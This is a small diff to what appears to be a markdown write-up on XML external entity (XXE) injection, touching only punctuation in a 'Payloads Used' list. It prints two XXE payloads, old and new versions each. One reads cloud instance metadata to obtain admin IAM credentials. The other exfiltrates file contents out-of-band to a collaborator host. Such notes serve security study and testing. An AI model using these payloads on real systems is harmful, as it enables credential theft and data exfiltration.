@@ -11,8 +11,8 @@ XXE injection also known as XML external entity injection. IT is a type of back 
 
 # Payloads Used 
 
-1) To obtain admin credentials: DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]
-2) To test random credentials: ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://burp-collaborator/?a=%file;'>" %eval %test 
+1) To obtain admin credentials DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]
+2) To test random credentials ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://burp-collaborator/?a=%file;'>" %eval %test 
 
 
 
